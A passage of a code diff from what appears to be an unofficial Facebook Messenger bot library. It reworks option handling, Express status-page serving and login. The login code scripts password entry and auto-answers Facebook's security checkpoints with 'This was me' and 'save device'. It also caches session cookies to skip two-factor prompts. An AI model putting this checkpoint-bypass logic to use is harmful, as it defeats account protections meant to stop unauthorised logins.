+    height: 40px;
+    background-color: #555;
+    color: #FFF;
+    border: 2px solid #FFF;
+    display: grid;
+    place-content: center;
+    border-radius: 50%;
+    z-index: 1;
+    transition: 0.4s;
+}
+.call:focus {
+    transform: rotateY(45deg) translateX(120px) translateZ(-70px);
+}
+.call:focus ~ .card {
+    transform: rotateY(45deg) translateX(140px) translateZ(-120px);
+}
+.call:focus ~ .icons {
+    height: var(--height);
+    transform: translateZ(var(--i-width)) translateY(-50%);
+}
+.icon {
+    position: relative;
+    width: var(--i-width);
+    height: var(--i-width);
+    transform-style: preserve-3d;
+    transform: rotateX(-40deg) rotateY(45deg);
+    transition: 0.7s;
+}
+.icons {
+    position: absolute;
+    left: 5px;
+    top: 50%;
+    width: var(--i-width);
+    height: calc(var(--i-width)*4);
+    transition: 0.6s;
+    display: flex;
+    flex-direction: column;
+    justify-content: space-between;
+    transform: translateZ(calc(var(--i-width) * -1)) translateY(-50%);
+    transform-style: preserve-3d;
+}
+.icon .fa-brands {
+    position: absolute;
+    left: 0;
+    top: 0;
+    width: 100%;
+    height: 100%;
+    background-color: #222;
+    color: #0FF;
+    border: 1px dashed #0FF;
+    display: grid;
+    place-content: center;
+    font-size: 1.2em;
+    transition: 0.5s;
+}
+.call:hover {
+    border-color: #222;
+    color: #000;
+    background-color: #FC0;
+}
+.icon:hover {
+    cursor: pointer;
+    transform: rotateX(-40deg) rotateY(315deg);
+}
+.icon:hover .fa-brands {
+    border-color: inherit;
+    background-color: #FFF;
+}
+.icon:hover .fa-facebook-f {
+    color: #0000dd;
+}
+.icon:hover .fa-twitter {
+    color: #002fff;
+}
+.icon:hover .fa-youtube {
+    color: #F00;
+}
+.icon:hover .fa-whatsapp {
+    color: #0F0;
+}
+.front {
+    transform: translateZ(calc(var(--i-width)*0.5));
+}
+.back {
+    transform: translateZ(calc(var(--i-width)* -0.5));
+}
+.left {
+    transform: rotateY(-90deg) translateZ(calc(var(--i-width)* 0.5));
+}
+.right {
+    transform: rotateY(90deg) translateZ(calc(var(--i-width)* 0.5));
+}
+.bottom {
+    transform: rotateX(-90deg) translateZ(calc(var(--i-width)* 0.5));
+}
+.top {
+    transform: rotateX(90deg) translateZ(calc(var(--i-width)* 0.5));
+}</style>`
+    //lazy to change
+}
+
+/!-[ Stating Http Infomation ]-!/
+
+express.set('DFP', (process.env.port || 8000));
+express.use(function(req, res, next) {
+    switch (req.url.split('?')[0]) {
+        case '/script.js': {
+            res.writeHead(200, { 'Content-Type': 'text/javascript' });
+                res.write(js);
+            break;
+        }
+        case '/style.css': {
+            res.writeHead(200, { 'Content-Type': 'text/css' });
+                res.write(css);
+            break;
+        }
+        // case '/History': {
+        //     if (req.query.PassWord == process.env.REPL_OWNER) {
+        //         res.writeHead(200, { 'Content-Type': 'application/json charset=utf-8' });
+        //         res.write(JSON.stringify(console.history,null,2),'utf8');
+        //         res.end();
+        //     }
+        //     else res.json({
+        //         Status: false,
+        //         Error: "Thiáº¿u Params ?PassWord=PassWordCuaBan =))"
+        //     });
+        //     break;
+        // }
+        default: {
+            res.writeHead(200, "OK", { "Content-Type": "text/html" });
+            res.write(ClassicHTML(global.Fca.Require.Priyansh.HTML.UserName, global.Fca.Data.PremText.includes("Premium") ? "Premium": "Free", global.Fca.Require.Priyansh.HTML.MusicLink));
+        }
+    }
+    res.end();
+})
+
+global.Fca.Require.Web = express;
+
+/!-[ Function setOptions ]-!/
 
-var defaultLogRecordSize = 100;
-log.maxRecordSize = defaultLogRecordSize;
+/**
+ * @param {{ [x: string]: boolean; selfListen?: boolean; listenEvents?: boolean; listenTyping?: boolean; updatePresence?: boolean; forceLogin?: boolean; autoMarkDelivery?: boolean; autoMarkRead?: boolean; autoReconnect?: boolean; logRecordSize: any; online?: boolean; emitReady?: boolean; userAgent: any; logLevel?: any; pageID?: any; proxy?: any; }} globalOptions
+ * @param {{ [x: string]: any; logLevel?: any; forceLogin?: boolean; userAgent?: any; pauseLog?: any; logRecordSize?: any; pageID?: any; proxy?: any; }} options
+ */
 
 function setOptions(globalOptions, options) {
     Object.keys(options).map(function(key) {
-        switch (key) {
-            case 'pauseLog':
-                if (options.pauseLog) log.pause();
-                break;
-            case 'online':
-                globalOptions.online = Boolean(options.online);
-                break;
-            case 'logLevel':
-                log.level = options.logLevel;
-                globalOptions.logLevel = options.logLevel;
-                break;
-            case 'logRecordSize':
-                log.maxRecordSize = options.logRecordSize;
-                globalOptions.logRecordSize = options.logRecordSize;
-                break;
-            case 'selfListen':
-                globalOptions.selfListen = Boolean(options.selfListen);
-                break;
-            case 'listenEvents':
-                globalOptions.listenEvents = Boolean(options.listenEvents);
-                break;
-            case 'pageID':
-                globalOptions.pageID = options.pageID.toString();
-                break;
-            case 'updatePresence':
-                globalOptions.updatePresence = Boolean(options.updatePresence);
-                break;
-            case 'forceLogin':
-                globalOptions.forceLogin = Boolean(options.forceLogin);
-                break;
-            case 'userAgent':
-                globalOptions.userAgent = options.userAgent;
+        switch (Boolean_Option.includes(key)) {
+            case true: {
+                globalOptions[key] = Boolean(options[key]);
                 break;
-            case 'autoMarkDelivery':
-                globalOptions.autoMarkDelivery = Boolean(options.autoMarkDelivery);
-                break;
-            case 'autoMarkRead':
-                globalOptions.autoMarkRead = Boolean(options.autoMarkRead);
-                break;
-            case 'listenTyping':
-                globalOptions.listenTyping = Boolean(options.listenTyping);
-                break;
-            case 'proxy':
-                if (typeof options.proxy != "string") {
-                    delete globalOptions.proxy;
-                    utils.setProxy();
-                } else {
-                    globalOptions.proxy = options.proxy;
-                    utils.setProxy(globalOptions.proxy);
+            }
+            case false: {
+                switch (key) {
+                    case 'pauseLog': {
+                        if (options.pauseLog) log.pause();
+                            else log.resume();
+                        break;
+                    }
+                    case 'logLevel': {
+                        log.level = options.logLevel;
+                            globalOptions.logLevel = options.logLevel;
+                        break;
+                    }
+                    case 'logRecordSize': {
+                        log.maxRecordSize = options.logRecordSize;
+                            globalOptions.logRecordSize = options.logRecordSize;
+                        break;
+                    }
+                    case 'pageID': {
+                        globalOptions.pageID = options.pageID.toString();
+                        break;
+                    }
+                    case 'userAgent': {
+                        globalOptions.userAgent = (options.userAgent || 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.64 Safari/537.36');
+                        break;
+                    }
+                    case 'proxy': {
+                        if (typeof options.proxy != "string") {
+                            delete globalOptions.proxy;
+                            utils.setProxy();
+                        } else {
+                            globalOptions.proxy = options.proxy;
+                            utils.setProxy(globalOptions.proxy);
+                        }
+                        break;
+                    }
+                    default: {
+                        log.warn("setOptions", "Unrecognized option given to setOptions: " + key);
+                        break;
+                    }
                 }
-                break;
-            case 'autoReconnect':
-                globalOptions.autoReconnect = Boolean(options.autoReconnect);
-                break;
-            case 'emitReady':
-                globalOptions.emitReady = Boolean(options.emitReady);
-                break;
-            default:
-                log.warn("setOptions", "Unrecognized option given to setOptions: " + key);
-                break;
+            break;
+            }
         }
     });
 }
 
+/!-[ Function BuildAPI ]-!/
+
+/**
+ * @param {any} globalOptions
+ * @param {string} html
+ * @param {{ getCookies: (arg0: string) => any[]; }} jar
+ */
+
 function buildAPI(globalOptions, html, jar) {
-    var maybeCookie = jar.getCookies("https://www.facebook.com").filter(function(val) {
-        return val.cookieString().split("=")[0] === "c_user";
-    });
+    var maybeCookie = jar.getCookies("https://www.facebook.com").filter(function(/** @type {{ cookieString: () => string; }} */val) { return val.cookieString().split("=")[0] === "c_user"; });
 
-    const objCookie = jar.getCookies("https://www.facebook.com").reduce(function (obj, val) {
-		obj[val.cookieString().split("=")[0]] = val.cookieString().split("=")[1];
-		return obj;
-	}, {});
+    if (maybeCookie.length === 0) {
+        switch (global.Fca.Require.Priyansh.AutoLogin) {
+            case true: {
+                global.Fca.Require.logger.Warning(global.Fca.Require.Language.Index.AutoLogin, function() {
+                    return global.Fca.AutoLogin();
+                });
+                break;
+            }
+            case false: {
+                throw { error: global.Fca.Require.Language.Index.ErrAppState };
 
-    if (maybeCookie.length === 0) throw { error: "PhÃ¡t Hiá»‡n Lá»—i Vá»‹ TrÃ­ ! HÃ£y Thá»­ ÄÄƒng Nháº­p VÃ´ TrÃ¬nh Duyá»‡t Chorme áº¨n Danh VÃ  Thá»­ Láº¡i !" };
+            }
+        }
+    }
 
-    if (html.indexOf("/checkpoint/block/?next") > -1) log.warn("login", "PhÃ¡t Hiá»‡n CheckPoint !, HÃ£y Thá»­ ÄÄƒng Nháº­p VÃ´ TrÃ¬nh Duyá»‡t áº¨n Danh VÃ  Thá»­ Láº¡i !");
+    if (html.indexOf("/checkpoint/block/?next") > -1) log.warn("login", Language.CheckPointLevelI);
 
-    var userID = objCookie.i_user || maybeCookie[0].cookieString().split("=")[1].toString();
-    log.info("login", `ÄÄƒng Nháº­p Táº¡i ID: ${userID}`);
+    var userID = maybeCookie[0].cookieString().split("=")[1].toString();
+    process.env['UID'] = logger.Normal(getText(Language.UID,userID), userID);
 
     try {
         clearInterval(checkVerified);
@@ -100,40 +861,40 @@ function buildAPI(globalOptions, html, jar) {
 
     var clientID = (Math.random() * 2147483648 | 0).toString(16);
 
-    let oldFBMQTTMatch = html.match(/irisSeqID:"(.+?)",appID:219994525426954,endpoint:"(.+?)"/);
-    let mqttEndpoint = null;
-    let region = null;
-    let irisSeqID = null;
-    var noMqttData = null;
-
-    if (oldFBMQTTMatch) {
-        irisSeqID = oldFBMQTTMatch[1];
-        mqttEndpoint = oldFBMQTTMatch[2];
-        region = new URL(mqttEndpoint).searchParams.get("region").toUpperCase();
-        log.info("login", `ÄÃ£ Láº¥y ÄÆ°á»£c Vá»‹ TrÃ­ Tin Nháº¯n Cá»§a TÃ i Khoáº£n LÃ  : ${region}`);
-    } else {
-        let newFBMQTTMatch = html.match(/{"app_id":"219994525426954","endpoint":"(.+?)","iris_seq_id":"(.+?)"}/);
-        if (newFBMQTTMatch) {
-            irisSeqID = newFBMQTTMatch[2];
-            mqttEndpoint = newFBMQTTMatch[1].replace(/\\\//g, "/");
-            region = new URL(mqttEndpoint).searchParams.get("region").toUpperCase();
-            log.info("login", `ÄÃ£ Láº¥y ÄÆ°á»£c Vá»‹ TrÃ­ Tin Nháº¯n Cá»§a TÃ i Khoáº£n LÃ  :  ${region}`);
-        } else {
-            let legacyFBMQTTMatch = html.match(/(\["MqttWebConfig",\[\],{fbid:")(.+?)(",appID:219994525426954,endpoint:")(.+?)(",pollingEndpoint:")(.+?)(3790])/);
-            if (legacyFBMQTTMatch) {
-                mqttEndpoint = legacyFBMQTTMatch[4];
-                region = new URL(mqttEndpoint).searchParams.get("region").toUpperCase();
-                log.warn("login", `Cannot get sequence ID with new RegExp. Fallback to old RegExp (without seqID)...`);
-                log.info("login", `ÄÃ£ Láº¥y ÄÆ°á»£c Vá»‹ TrÃ­ Tin Nháº¯n Cá»§a TÃ i Khoáº£n LÃ  : ${region}`);
-                log.info("login", `[Unused] Polling endpoint: ${legacyFBMQTTMatch[6]}`);
-            } else {
-                log.warn("login", "KhÃ´ng Thá»ƒ Láº¥y ID HÃ£y Thá»­ Láº¡i !");
-                noMqttData = html;
+    var CHECK_MQTT = {
+        oldFBMQTTMatch: html.match(/irisSeqID:"(.+?)",appID:219994525426954,endpoint:"(.+?)"/),
+        newFBMQTTMatch: html.match(/{"app_id":"219994525426954","endpoint":"(.+?)","iris_seq_id":"(.+?)"}/),
+        legacyFBMQTTMatch: html.match(/(\["MqttWebConfig",\[\],{fbid:")(.+?)(",appID:219994525426954,endpoint:")(.+?)(",pollingEndpoint:")(.+?)(3790])/)
+    }
+
+    let Slot = Object.keys(CHECK_MQTT);
+
+    var mqttEndpoint,region,irisSeqID;
+    Object.keys(CHECK_MQTT).map(function(MQTT) {
+        if (CHECK_MQTT[MQTT] && !region) {
+            switch (Slot.indexOf(MQTT)) {
+                case 0: {
+                    irisSeqID = CHECK_MQTT[MQTT][1];
+                        mqttEndpoint = CHECK_MQTT[MQTT][2];
+                        region = new URL(mqttEndpoint).searchParams.get("region").toUpperCase();
+                    return;
+                }
+                case 1: {
+                    irisSeqID = CHECK_MQTT[MQTT][2];
+                        mqttEndpoint = CHECK_MQTT[MQTT][1].replace(/\\\//g, "/");
+                        region = new URL(mqttEndpoint).searchParams.get("region").toUpperCase();
+                    return;
+                }
+                case 2: {
+                    mqttEndpoint = CHECK_MQTT[MQTT][4];
+                        region = new URL(mqttEndpoint).searchParams.get("region").toUpperCase();
+                    return;
+                }
             }
+        return;
         }
-    }
+    });    
 
-    // All data available to api functions
     var ctx = {
         userID: userID,
         jar: jar,
@@ -145,8 +906,8 @@ function buildAPI(globalOptions, html, jar) {
         mqttClient: undefined,
         lastSeqId: irisSeqID,
         syncToken: undefined,
-        mqttEndpoint,
-        region,
+        mqttEndpoint: mqttEndpoint,
+        region: region,
         firstListen: true
     };
 
@@ -157,77 +918,40 @@ function buildAPI(globalOptions, html, jar) {
         }
     };
 
-    if (noMqttData) api["htmlData"] = noMqttData;
-
-    const apiFuncNames = [
-        'addExternalModule',
-        'addUserToGroup',
-        'changeAdminStatus',
-        'changeArchivedStatus',
-        'changeBio',
-        'changeBlockedStatus',
-        'changeGroupImage',
-        'changeNickname',
-        'changeThreadColor',
-        'changeThreadEmoji',
-        'createNewGroup',
-        'createPoll',
-        'deleteMessage',
-        'deleteThread',
-        'forwardAttachment',
-        'getCurrentUserID',
-        'getEmojiUrl',
-        'getFriendsList',
-        'getThreadHistory',
-        'getThreadInfo',
-        'getThreadList',
-        'getThreadPictures',
-        'getUserID',
-        'getUserInfo',
-        'handleMessageRequest',
-        'listenMqtt',
-        'logout',
-        'markAsDelivered',
-        'markAsRead',
-        'markAsReadAll',
-        'markAsSeen',
-        'muteThread',
-        'removeUserFromGroup',
-        'resolvePhotoUrl',
-        'searchForThread',
-        'sendMessage',
-        'sendTypingIndicator',
-        'setMessageReaction',
-        'setTitle',
-        'threadColors',
-        'unsendMessage',
-        'unfriend',
-
-        // HTTP
-        'httpGet',
-        'httpPost',
-
-        // Deprecated features
-        "getThreadListDeprecated",
-        'getThreadHistoryDeprecated',
-        'getThreadInfoDeprecated',
-    ];
+    if (region && mqttEndpoint) {
+        //do sth
+    }
+    else {
+        log.warn("login", getText(Language.NoAreaData));
+        api["htmlData"] = html;
+    }
 
     var defaultFuncs = utils.makeDefaults(html, userID, ctx);
 
-    // Load all api functions in a loop
-    apiFuncNames.map(v => api[v] = require('./src/' + v)(defaultFuncs, api, ctx));
+    fs.readdirSync(__dirname + "/src").filter((/** @type {string} */File) => File.endsWith(".js") && !File.includes('Dev_')).map((/** @type {string} */File) => api[File.split('.').slice(0, -1).join('.')] = require('./src/' + File)(defaultFuncs, api, ctx));
 
-    return [ctx, defaultFuncs, api];
+    return {
+        ctx,
+        defaultFuncs, 
+        api
+    };
 }
 
+/!-[ Function makeLogin ]-!/
+
+/**
+ * @param {{ setCookie: (arg0: any, arg1: string) => void; }} jar
+ * @param {any} email
+ * @param {any} password
+ * @param {{ forceLogin: any; }} loginOptions
+ * @param {(err: any, api: any) => any} callback
+ * @param {any} prCallback
+ */
+
 function makeLogin(jar, email, password, loginOptions, callback, prCallback) {
-    return function(res) {
-        var html = res.body;
-        var $ = cheerio.load(html);
-        var arr = [];
+    return function(/** @type {{ body: any; }} */res) {
+        var html = res.body,$ = cheerio.load(html),arr = [];
 
-        // This will be empty, but just to be sure we leave it
         $("#login_form input").map((i, v) => arr.push({ val: $(v).val(), name: $(v).attr("name") }));
 
         arr = arr.filter(function(v) {
@@ -235,60 +959,50 @@ function makeLogin(jar, email, password, loginOptions, callback, prCallback) {
         });
 
         var form = utils.arrToForm(arr);
-        form.lsd = utils.getFrom(html, "[\"LSD\",[],{\"token\":\"", "\"}");
-        form.lgndim = Buffer.from("{\"w\":1440,\"h\":900,\"aw\":1440,\"ah\":834,\"c\":24}").toString('base64');
-        form.email = email;
-        form.pass = password;
-        form.default_persistent = '0';
-        form.lgnrnd = utils.getFrom(html, "name=\"lgnrnd\" value=\"", "\"");
-        form.locale = 'en_US';
-        form.timezone = '240';
-        form.lgnjs = ~~(Date.now() / 1000);
-
-
-        // Getting cookies from the HTML page... (kill me now plz)
-        // we used to get a bunch of cookies in the headers of the response of the
-        // request, but FB changed and they now send those cookies inside the JS.
-        // They run the JS which then injects the cookies in the page.
-        // The "solution" is to parse through the html and find those cookies
-        // which happen to be conveniently indicated with a _js_ in front of their
-        // variable name.
-        //
-        // ---------- Very Hacky Part Starts -----------------
-        var willBeCookies = html.split("\"_js_");
-        willBeCookies.slice(1).map(function(val) {
-            var cookieData = JSON.parse("[\"" + utils.getFrom(val, "", "]") + "]");
-            jar.setCookie(utils.formatCookie(cookieData, "facebook"), "https://www.facebook.com");
+            form.lsd = utils.getFrom(html, "[\"LSD\",[],{\"token\":\"", "\"}");
+            form.lgndim = Buffer.from("{\"w\":1440,\"h\":900,\"aw\":1440,\"ah\":834,\"c\":24}").toString('base64');
+            form.email = email;
+            form.pass = password;
+            form.default_persistent = '0';
+            form.locale = 'en_US';     
+            form.timezone = '240';
+            form.lgnjs = ~~(Date.now() / 1000);
+
+        html.split("\"_js_").slice(1).map((/** @type {any} */val) => {
+            jar.setCookie(utils.formatCookie(JSON.parse("[\"" + utils.getFrom(val, "", "]") + "]"), "facebook"),"https://www.facebook.com")
         });
-        // ---------- Very Hacky Part Ends -----------------
 
-        log.info("login", "Logging in...");
+        logger.Normal(Language.OnLogin);
         return utils
             .post("https://www.facebook.com/login/device-based/regular/login/?login_attempt=1&lwv=110", jar, form, loginOptions)
             .then(utils.saveCookies(jar))
-            .then(function(res) {
-                var headers = res.headers;
-                if (!headers.location) throw { error: "Sai Máº­t Kháº©u Hoáº·c TÃ i Khoáº£n !" };
+            .then(function(/** @type {{ headers: any; }} */res) {
+                var headers = res.headers;  
+                if (!headers.location) throw { error: Language.InvaildAccount };
 
                 // This means the account has login approvals turned on.
                 if (headers.location.indexOf('https://www.facebook.com/checkpoint/') > -1) {
-                    log.info("login", "Heyyy M Báº­t Hai Báº£o Máº­t KÃ¬a");
+                    logger.Warning(Language.TwoAuth);
                     var nextURL = 'https://www.facebook.com/checkpoint/?next=https%3A%2F%2Fwww.facebook.com%2Fhome.php';
 
                     return utils
                         .get(headers.location, jar, null, loginOptions)
                         .then(utils.saveCookies(jar))
-                        .then(function(res) {
-                            var html = res.body;
-                            // Make the form in advance which will contain the fb_dtsg and nh
-                            var $ = cheerio.load(html);
-                            var arr = [];
+                        .then(async function(/** @type {{ body: any; }} */res) {
+                            if (!await Database.get('ThroughAcc')) {
+                                await Database.set('ThroughAcc', email);
+                            }
+                            else {
+                                if (String((await Database.get('ThroughAcc'))).replace(RegExp('"','g'), '') != String(email).replace(RegExp('"','g'), '')) {
+                                    await Database.set('ThroughAcc', email);
+                                    if (await Database.get('Through2Fa')) {
+                                        await Database.delete('Through2Fa');
+                                    }
+                                }
+                            }
+                            var html = res.body,$ = cheerio.load(html), arr = [];
                             $("form input").map((i, v) => arr.push({ val: $(v).val(), name: $(v).attr("name") }));
-
-                            arr = arr.filter(function(v) {
-                                return v.val && v.val.length;
-                            });
-
+                            arr = arr.filter(v => { return v.val && v.val.length });
                             var form = utils.arrToForm(arr);
                             if (html.indexOf("checkpoint/?next") > -1) {
                                 setTimeout(() => {
@@ -297,94 +1011,296 @@ function makeLogin(jar, email, password, loginOptions, callback, prCallback) {
                                         jazoest: form.jazoest,
                                         dpr: 1
                                     });
-                                }, 2500);
-                                throw {
-                                    error: 'login-approval',
-                                    continue: function submit2FA(code) {
-                                        form.approvals_code = code;
-                                        form['submit[Continue]'] = $("#checkpointSubmitButton").html(); //'Continue';
-                                        var prResolve = null;
-                                        var prReject = null;
-                                        var rtPromise = new Promise(function(resolve, reject) {
-                                            prResolve = resolve;
-                                            prReject = reject;
-                                        });
-                                        if (typeof code == "string") {
-                                            utils
-                                                .post(nextURL, jar, form, loginOptions)
-                                                .then(utils.saveCookies(jar))
-                                                .then(function(res) {
-                                                    var $ = cheerio.load(res.body);
-                                                    var error = $("#approvals_code").parent().attr("data-xui-error");
-                                                    if (error) {
-                                                        throw {
-                                                            error: 'login-approval',
-                                                            errordesc: "Invalid 2FA code.",
-                                                            lerror: error,
-                                                            continue: submit2FA
-                                                        };
-                                                    }
-                                                })
-                                                .then(function() {
-                                                    // Use the same form (safe I hope)
-                                                    delete form.no_fido;
-                                                    delete form.approvals_code;
-                                                    form.name_action_selected = 'dont_save'; //'save_device';
-
-                                                    return utils.post(nextURL, jar, form, loginOptions).then(utils.saveCookies(jar));
-                                                })
-                                                .then(function(res) {
-                                                    var headers = res.headers;
-                                                    if (!headers.location && res.body.indexOf('Review Recent Login') > -1) throw { error: "Something went wrong with login approvals." };
-
-                                                    var appState = utils.getAppState(jar);
-
-                                                    if (callback === prCallback) {
-                                                        callback = function(err, api) {
-                                                            if (err) return prReject(err);
-                                                            return prResolve(api);
-                                                        };
-                                                    }
-
-                                                    // Simply call loginHelper because all it needs is the jar
-                                                    // and will then complete the login process
-                                                    return loginHelper(appState, email, password, loginOptions, callback);
-                                                })
-                                                .catch(function(err) {
-                                                    // Check if using Promise instead of callback
-                                                    if (callback === prCallback) prReject(err);
-                                                    else callback(err);
+                                }, 2500);  
+                                switch (global.Fca.Require.Priyansh.Login2Fa) {
+                                    case true: {
+                                        try {
+                                            const question = question => {
+                                                const rl = readline.createInterface({
+                                                    input: process.stdin,
+                                                    output: process.stdout
                                                 });
-                                        } else {
-                                            utils
-                                                .post("https://www.facebook.com/checkpoint/?next=https%3A%2F%2Fwww.facebook.com%2Fhome.php", jar, form, loginOptions, null, { "Referer": "https://www.facebook.com/checkpoint/?next" })
-                                                .then(utils.saveCookies(jar))
-                                                .then(res => {
-                                                    try {
-                                                        JSON.parse(res.body.replace(/for\s*\(\s*;\s*;\s*\)\s*;\s*/, ""));
-                                                    } catch (ex) {
-                                                        clearInterval(checkVerified);
-                                                        log.info("login", "Verified from browser. Logging in...");
-                                                        if (callback === prCallback) {
-                                                            callback = function(err, api) {
-                                                                if (err) return prReject(err);
-                                                                return prResolve(api);
-                                                            };
+                                                return new Promise(resolve => {
+                                                    rl.question(question, answer => {
+                                                        rl.close();
+                                                        return resolve(answer);
+                                                    });
+                                                });
+                                            };
+                                            async function EnterSecurityCode() {
+                                                try {
+                                                    var Through2Fa = await Database.get('Through2Fa');
+                                                    if (Through2Fa) {
+                                                        Through2Fa.map(function(/** @type {{ key: string; value: string; expires: string; domain: string; path: string; }} */c) {
+                                                            let str = c.key + "=" + c.value + "; expires=" + c.expires + "; domain=" + c.domain + "; path=" + c.path + ";";
+                                                            jar.setCookie(str, "http://" + c.domain);
+                                                        })
+                                                        var from2 = utils.arrToForm(arr);
+                                                            from2.lsd = utils.getFrom(html, "[\"LSD\",[],{\"token\":\"", "\"}");
+                                                            from2.lgndim = Buffer.from("{\"w\":1440,\"h\":900,\"aw\":1440,\"ah\":834,\"c\":24}").toString('base64');
+                                                            from2.email = email;
+                                                            from2.pass = password;
+                                                            from2.default_persistent = '0';
+                                                            from2.locale = 'en_US';     
+                                                            from2.timezone = '240';
+                                                            from2.lgnjs = ~~(Date.now() / 1000);
+                                                        return utils
+                                                            .post("https://www.facebook.com/login/device-based/regular/login/?login_attempt=1&lwv=110", jar, from2, loginOptions)
+                                                            .then(utils.saveCookies(jar))
+                                                            .then(function(/** @type {{ headers: any; }} */res) {
+                                                        var headers = res.headers;  
+                                                        if (!headers['set-cookie'][0].includes('deleted')) {
+                                                            logger.Warning(Language.ErrThroughCookies, async function() {
+                                                                await Database.delete('Through2Fa');
+                                                            });
+                                                            process.exit(1);
                                                         }
-                                                        return loginHelper(utils.getAppState(jar), email, password, loginOptions, callback);
+                                                            if (headers.location && headers.location.indexOf('https://www.facebook.com/checkpoint/') > -1) {
+                                                                return utils
+                                                                    .get(headers.location, jar, null, loginOptions)
+                                                                    .then(utils.saveCookies(jar))
+                                                                    .then(function(/** @type {{ body: any; }} */res) {
+                                                                        var html = res.body,$ = cheerio.load(html), arr = [];
+                                                                        $("form input").map((i, v) => arr.push({ val: $(v).val(), name: $(v).attr("name") }));
+                                                                        arr = arr.filter(v => { return v.val && v.val.length });
+                                                                        var from2 = utils.arrToForm(arr);
+
+                                                                        if (html.indexOf("checkpoint/?next") > -1) {
+                                                                            setTimeout(() => {
+                                                                                checkVerified = setInterval((_form) => {}, 5000, {
+                                                                                    fb_dtsg: from2.fb_dtsg,
+                                                                                    jazoest: from2.jazoest,
+                                                                                    dpr: 1
+                                                                                });
+                                                                            }, 2500);
+                                                                            if (!res.headers.location && res.headers['set-cookie'][0].includes('checkpoint')) {
+                                                                                try {
+                                                                                    delete from2.name_action_selected;
+                                                                                    from2['submit[Continue]'] = $("#checkpointSubmitButton").html();
+                                                                                    return utils
+                                                                                        .post(nextURL, jar, from2, loginOptions)
+                                                                                        .then(utils.saveCookies(jar))
+                                                                                        .then(function() {
+                                                                                            from2['submit[This was me]'] = "This was me";
+                                                                                            return utils.post(nextURL, jar, from2, loginOptions).then(utils.saveCookies(jar));
+                                                                                        })
+                                                                                        .then(function() {
+                                                                                            delete from2['submit[This was me]'];
+                                                                                            from2.name_action_selected = 'save_device';
+                                                                                            from2['submit[Continue]'] = $("#checkpointSubmitButton").html();
+                                                                                            return utils.post(nextURL, jar, from2, loginOptions).then(utils.saveCookies(jar));
+                                                                                        })
+                                                                                        .then(async function(/** @type {{ headers: any; body: string | string[]; }} */res) {
+                                                                                            var headers = res.headers;
+                                                                                            if (!headers.location && res.headers['set-cookie'][0].includes('checkpoint')) throw { error: "wtf ??:D" };
+                                                                                            var appState = utils.getAppState(jar,false);
+                                                                                            await Database.set('Through2Fa', appState);
+                                                                                            return loginHelper(appState, email, password, loginOptions, callback);
+                                                                                        })
+                                                                                    .catch((/** @type {any} */e) => callback(e));
+                                                                                }
+                                                                                catch (e) {
+                                                                                    console.log(e)
+                                                                                }
+                                                                            }
+                                                                        }
+                                                                    })
+                                                                }
+                                                            return utils.get('https://www.facebook.com/', jar, null, loginOptions).then(utils.saveCookies(jar));
+                                                        }).catch((/** @type {any} */e) => console.log(e));
                                                     }
-                                                })
-                                                .catch(ex => {
-                                                    log.error("login", ex);
-                                                    if (callback === prCallback) prReject(ex);
-                                                    else callback(ex);
-                                                });
+                                                }
+                                                catch (e) {
+                                                    await Database.delete('Through2Fa');
+                                                }
+                                            var code = await question(Language.EnterSecurityCode);
+                                                try {
+                                                    form.approvals_code = code;
+                                                    form['submit[Continue]'] = $("#checkpointSubmitButton").html();
+                                                    var prResolve,prReject;
+                                                    var rtPromise = new Promise((resolve, reject) => { prResolve = resolve; prReject = reject; });
+                                                    if (typeof code == "string") { //always strings
+                                                        utils
+                                                            .post(nextURL, jar, form, loginOptions)
+                                                            .then(utils.saveCookies(jar))
+                                                            .then(function(/** @type {{ body: string | Buffer; }} */res) {
+                                                                var $ = cheerio.load(res.body);
+                                                                var error = $("#approvals_code").parent().attr("data-xui-error");
+                                                                if (error) {
+                                                                        logger.Warning(Language.InvaildTwoAuthCode,function() { EnterSecurityCode(); }); //bruh loop
+                                                                    };
+                                                                })
+                                                            .then(function() {
+                                                                delete form.no_fido;delete form.approvals_code;
+                                                                form.name_action_selected = 'save_device'; //'save_device' || 'dont_save;
+                                                                return utils.post(nextURL, jar, form, loginOptions).then(utils.saveCookies(jar));
+                                                            })  
+                                                            .then(async function(/** @type {{ headers: any; body: string | string[]; }} */res) {
+                                                                var headers = res.headers;
+                                                                if (!headers.location && res.headers['set-cookie'][0].includes('checkpoint')) {
+                                                                    try {
+                                                                        delete form.name_action_selected;
+                                                                        form['submit[Continue]'] = $("#checkpointSubmitButton").html();
+                                                                        return utils
+                                                                            .post(nextURL, jar, form, loginOptions)
+                                                                            .then(utils.saveCookies(jar))
+                                                                            .then(function() {
+                                                                                form['submit[This was me]'] = "This was me";
+                                                                                return utils.post(nextURL, jar, form, loginOptions).then(utils.saveCookies(jar));
+                                                                            })
+                                                                            .then(function() {
+                                                                                delete form['submit[This was me]'];
+                                                                                form.name_action_selected = 'save_device';
+                                                                                form['submit[Continue]'] = $("#checkpointSubmitButton").html();
+                                                                                return utils.post(nextURL, jar, form, loginOptions).then(utils.saveCookies(jar));
+                                                                            })
+                                                                            .then(async function(/** @type {{ headers: any; body: string | string[]; }} */res) {
+                                                                                var headers = res.headers;
+                                                                                if (!headers.location && res.headers['set-cookie'][0].includes('checkpoint')) throw { error: "wtf ??:D" };
+                                                                                var appState = utils.getAppState(jar,false);
+                                                                                await Database.set('Through2Fa', appState);
+                                                                                return loginHelper(appState, email, password, loginOptions, callback);
+                                                                            })
+                                                                        .catch((/** @type {any} */e) => callback(e));
+                                                                    }
+                                                                    catch (e) {
+                                                                        console.log(e)
+                                                                    }
+                                                                }
+                                                                var appState = utils.getAppState(jar,false);
+                                                                if (callback === prCallback) {
+                                                                    callback = function(/** @type {any} */err, /** @type {any} */api) {
+                                                                        if (err) return prReject(err);
+                                                                        return prResolve(api);
+                                                                    };
+                                                                }
+                                                                await Database.set('Through2Fa', appState);
+                                                                return loginHelper(appState, email, password, loginOptions, callback);
+                                                            })
+                                                            .catch(function(/** @type {any} */err) {
+                                                                if (callback === prCallback) prReject(err);
+                                                                else callback(err);
+                                                            });
+                                                    } else {
+                                                        utils
+                                                            .post("https://www.facebook.com/checkpoint/?next=https%3A%2F%2Fwww.facebook.com%2Fhome.php", jar, form, loginOptions, null, { "Referer": "https://www.facebook.com/checkpoint/?next" })
+                                                            .then(utils.saveCookies(jar))
+                                                            .then(async function(/** @type {{ body: string; }} */res) {
+                                                                try { 
+                                                                    JSON.parse(res.body.replace(/for\s*\(\s*;\s*;\s*\)\s*;\s*/, ""));
